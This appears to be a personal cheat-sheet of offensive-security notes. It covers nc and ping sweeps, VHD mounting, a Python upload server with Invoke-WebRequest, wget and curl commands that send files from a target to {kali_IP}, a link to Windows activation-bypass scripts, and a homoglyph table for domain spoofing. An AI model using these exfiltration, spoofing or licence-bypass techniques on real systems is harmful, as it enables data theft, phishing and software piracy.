---
layout: blank
pagetitle: Miscellaneous Notes
---

We have nmap at home
- `for i in \$(seq 1 254); do nc -zv -w 1 {IP/24}.$i {port}; done`
  - For a more basic ping sweep:
    - `for /l %i in (1,1,254) do @ping {IP/24}.%i -w 1 -n 1`

Mount a Windows vhd:
- `sudo apt install libguestfs-tools`
- `guestmount --add {vhd_file} --inspector --ro -v /mnt/{dir_to_mount_to}`
  - `-ro` is readonly

- Activate Windows with [https://github.com/massgravel/Microsoft-Activation-Scripts](https://github.com/massgravel/Microsoft-Activation-Scripts)
  - Uses [https://get.activated.win/](https://get.activated.win/)
- Use [https://uupdump.net/](https://uupdump.net/) to make Windows images (uses Microsoft servers so we get base images without all of the bloat)

A basic python upload server example `sudo python3 upload_server.py` (if [updog](https://github.com/sc0tfree/updog) isn't available)

```python
#!/usr/bin/env python3
from http.server import SimpleHTTPRequestHandler, HTTPServer
import socket

class FileUploadHTTPRequestHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(b"""
<form method="POST" enctype="multipart/form-data">
<input type="file" name="file">
<input type="submit">
</form>
""")

    def do_POST(self):
        ctype = self.headers.get("Content-Type", "")
        length = int(self.headers.get("Content-Length", 0))
        data = self.rfile.read(length)

        if ctype.startswith("multipart/form-data"):
            boundary = ctype.split("boundary=")[1].encode()
            parts = data.split(b"--" + boundary)
            for p in parts:
                if b"Content-Disposition" in p:
                    head, body = p.split(b"\r\n\r\n", 1)
                    name = head.split(b'filename="')[1].split(b'"')[0].decode()
                    with open(name, "wb") as f:
                        f.write(body.rstrip(b"\r\n--"))
                    break
        else:
            name = self.headers.get("filename", "upload.bin")
            with open(name, "wb") as f:
                f.write(data)

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

if __name__ == "__main__":
    port = 8080
    ip = get_local_ip()
    print(f"Serving on http://{ip}:{port}")
    httpd = HTTPServer(("0.0.0.0", port), FileUploadHTTPRequestHandler)
    httpd.serve_forever()
```
Then on Windows:
`Invoke-WebRequest -Uri "http://{kali_IP}:8080/upload" -Method Post -InFile "{filename}" -Headers @{"filename"="{filename}"} -UseBasicParsing`

Similarly on Linux:
`wget --method=POST --header="filename: {filename}" --body-file="{filename}" http://{kali_IP}:8080/upload`
or 
`curl -X POST -H "filename: {filename}" --data-binary "@{filename}" http://{kali_IP}:8080/upload`


**Homoglyphs**

- These characters can kind of be a massive help no matter what you're attacking (we <3 unicode)
  - For example, domain spoofing is a classic, where you use `ơ` (Vietnamese) instead of `o` (English)
- Homoglyph table:

|Original Character| Homoglyphs (Sorted by Similarity)|
|---|---|
| a |	а, ạ, ą, ä, à, á, ᴀ, ₐ, ᵃ, Α, Α̇, А, Ꭺ, ᗅ, ꓮ, ꓯ, Ａ, 𐊠, 𝐀, 𝐴, 𝑨, 𝒜, 𝓐, 𝔄, 𝔸, 𝕬, 𝖠, 𝗔, 𝘈, 𝘼, 𝙰, 𝚨, 𝛢, 𝜜, 𝝖, 𝞐, ᴬ, ª, ɑ, ǟ, ꬱ |
| b |	ƅ, ᵇ, ᵦ, Ɓ, Β, В, Ᏼ, ᏼ, ᗷ, ᛒ, ℬ, ꓐ, Ꞵ, Ｂ, ᴮ |
| c |	с, ƈ, ċ, ᴄ, ᵓ, ᶜ, Ϲ, С, Ꮯ, 𐐕, ᑕ, ℂ, ℭ, ⸦, ꓚ, Ｃ, 𐊢, 𐌂, ↄ, ɔ, Ꜿ |
| d |	ԁ, ɗ, ᶁ, ꝺ, ᵈ, Ꭰ, ᗞ, ᗪ, ᴅ, ⅅ, Ⅾ, ꓓ, Ｄ, ᴰ |
| e |	е, ẹ, ė, é, è, ₑ, ᵉ, Ε, Е, Ꭼ, ⴹ, ꓰ, Ｅ, 𑢮, ᴱ, ɛ, ɇ, ꬲ |
| f |	ᶠ, Ϝ, ᖴ, ℱ, ꓝ, Ꞙ, Ｆ, 𐊇, 𐊥, ꜰ |
| g |	ġ, ɡ, ց, ᶃ, ǥ, ǵ, ᵍ, ℊ, ⅁, ꓖ, Ｇ, ᴳ, ց, ǵ, ǥ |
| h |	һ, ʰ, Η, Н, Ꮋ, Ꮒ, ℋ, ℌ, ꓧ, Ｈ, ᴴ |
| i |	і, í, ï, ⁱ, ᵢ, Ⅰ, Ⅰ, ⅼ, 丨, ι, ℐ, ℑ, ∣, ⍳, Ⲓ, ⵏ, ꓲ, ᴵ |
| j |	ј, ʝ, ϳ, ʲ, Ј, ᴊ, Ʝ, Ｊ, ᴶ |
| k |	κ, ᵏ, Κ, К, ᛕ, Ⲕ, ꓗ, Ｋ, ᴷ, ĸ, ꝁ |
| l |	ӏ, ḷ, ˡ, Ⅰ, ⅼ, ℓ, ∣, ⏽, Ⲓ, ⵏ, ꓲ, ᴸ |
| m |	ᵐ, Μ, М, ᴍ, ℳ, ꟽ, Ⲙ, ꓟ, Ｍ, ᴹ, ɱ, ꟿ |
| n |	ո, ⁿ, ₙ, Ν, Ն, ᴎ, ℕ, ꓠ, Ｎ, ᴺ, ŋ, ɴ, ꞃ |
| o |	о, ο, օ, ȯ, ọ, ỏ, ơ, ó, ò, ö, ᵒ, º, Ο, О, Օ, ०, ꓳ, 〇, Ⲟ, ⲟ, Ｏ, ᴼ |
| p |	р, ᵖ, Ρ, Р, ℙ, Ⲣ, ꓑ, Ｐ, ᴾ |
| q |	զ, ԛ, ɋ, ʠ, ᵠ, ℚ, Ꝗ, Ｑ |
| r |	г, ᴦ, ʳ, Γ, ℛ, Ⲣ, ꓣ, Ｒ, ᴿ, ɼ, ʁ, ꝛ |
| s |	ʂ, ˢ, Ѕ, Ꚃ, Ꙅ, ꙅ, ⴑ, Ｓ, ꜱ, ꞩ |
| t |	τ, ꚋ, ᵗ, Τ, Т, ᴛ, Ⲧ, ꓔ, Ｔ, ᵀ, ŧ, ʈ, ꞇ |
| u |	υ, ս, ü, ú, ù, ᵘ, ᵤ, ∪, 𝕌, 𝖀, ꓴ, Ｕ, ᵁ, μ, υ, ᴜ |
| v |	ν, ѵ, ᴠ, ꝟ, ᵛ, ∨, 𝖁, ꓦ, Ｖ, ⱽ, ʌ, ʋ |
| w |	ѡ, ԝ, ʷ, ᴡ, ꓪ, Ｗ, ᵂ, ɯ, ω, ꝡ |
| x |	х, ҳ, ẋ, ˣ, ×, ⤫, ⤬, ⨯, ꓫ, Ｘ |
| y |	у, ý, ʸ, Υ, Ү, ɣ, ꓬ, Ｙ |
| z |	ʐ, ż, ƶ, ᶻ, ℤ, ꓜ, Ｚ |
| 0 |	0, Ο, ο, О, о, Օ, 〇, ꓳ, Ⲟ, ⲟ, Ｏ, 𝟎, 𝟘, 𝟢, 𝟬, ∅, ⌀, ⓪ |
| 1 |	1, ɪ, ｜, ǀ, Ⅰ, ⅼ, ∣, 𝟏, 𝟙, 𝟣, 𝟭, ᧚, 𐄇 |
| 2 |	2, Ƨ, Ϩ, ᒿ, Ꙅ, 𝟐, 𝟚, 𝟤, 𝟮, ², ᒿ, ², ᪂ |
| 3 |	3, Ʒ, Ȝ, З, Ӡ, 𝟑, 𝟛, 𝟥, 𝟯, ³, ǫ, ʒ, ꣓ |
| 4 |	4, Ꮞ, ４, 𝟒, 𝟜, 𝟦, 𝟰, ᪄, ᥊ |
| 5 |	5, Ƽ, ５, 𝟓, 𝟝, 𝟧, 𝟱, ƽ, ᥋ |
| 6 |	6, б, Ꮾ, Ⳓ, ６, 𝟔, 𝟞, 𝟨, 𝟲 |
| 7 |	7, 𐓒, ７, 𝟕, 𝟟, 𝟩, 𝟳, 𐌣, 𐏓 |
| 8 |	8, Ȣ, ȣ, ৮, ８, 𝟖, 𝟠, 𝟪, 𝟴, ꣘ |
| 9 |	9, ৭, Ⳋ, ９, 𝟗, 𝟡, 𝟫, 𝟵, գ, ꣙ |
| ! |	!, ǃ, ⵑ, ！, ❗, ❕, ꜟ, ❢, ❣ |
| $ |	$, ＄, 💲, ৳, 𐆖 |
| ? |	?, Ɂ, ʔ, ？, ❓, ❔, ʡ, ॽ, ¿ |
| , |	‚, ，, 、 |
| . |	·, ․, 。, ．, ｡ |
| _ |	＿, __, ▁, ▂, ▃, ▄, ▅, ▆, ▇, █, ‗, ⸗ |
| - |	‐, ‑, ‒, –, —, ―, ⁃, ⁻, ₋, −, ﹣, －, ㅡ, ֊, ־, ᐀ |
| + |	＋, ➕, ⁺, ₊, ✚, ✙, ᛭, 𐊛 |
| # |	＃, ⋕, ♯, ⌗, ╬ |
| * |	⁎, ⁕, ∗, ⋆, ＊, ✱, ✲, ✳, ✴, ✵, ✶, ✷, ✸, ✹, ✺, ✻, ✼, ✽, ✾, ✿, ❀, ❁, ❂, ❃, ❄, ❅, ❆, ❇, ❈, ❉, ❊, ❋ |
| % |	％, ⁒, ℅, ⌘ |
| / |	∕, ⁄, ／, ⟋, ⧸, ⫶, ̷ |
| ( |	⁽, ₍, （, ﹙, ❨, ❪, ⟮, ⦅, ⦗, ⸨ |
| ) |	⁾, ₎, ）, ﹚, ❩, ❫, ⟯, ⦆, ⦘, ⸩ |
| [ |	［, ⁅, ❲, 【, 〔, ⟦, ⟬, ⦋, ⦍, ⦏, ⦗ |
| ] |	］, ⁆, ❳, 】, 〕, ⟧, ⟭, ⦌, ⦎, ⦐, ⦘ |
| = |	＝, ⹀, ≡, ⸗, ꞊, ᐨ, ⸭, ゠ |
| & |	＆, ⅋, ﹠, ＆, 🙰, 🙵 |
| § |	§, ⸹, ﹩, ⟈, ⟕ |
| " |	", ", ＂, ″, ˝, ˮ |
| ' |	', ', ʹ, ʹ, ˊ, ՚, ＇, ´, ` |
| ~ |	∼, ˜, ⁓, ∽, ∿, ～, ≈, ≋, ⍨, 〰️, ᷉ |
| \| |	｜, ￨, ⎜, ⎢, ⎥, ⎮, ⏐, ⏽, ⏾, ⏿, ∣, ⼁, ｜, ǀ, ‖ |
| < |	＜, ‹, ❮, ❰, ⟨, 〈, 〈, 《, ≺, ⋖, ⋘, ⫷ |
| > |	＞, ›, ❯, ❱, ⟩, 〉, 〉, 》, ≻, ⋗, ⋙, ⫸ |
| ^ |	＾, ˆ, ˄, ⁁, ⌃, ⎺, ⏜, ∧, ∨, ⋀, ꜛ | 
| ° |	˚, ⁰, °, ∘, ○, ◦, ॰, ⚬, 。, ⸰ |
| Space | 	  (narrow no-break space), 　 (full-width space),   (medium mathematical space) |
| Tab |	⇥ (rightwards arrow to bar), ⭾ (alternative tab symbol) |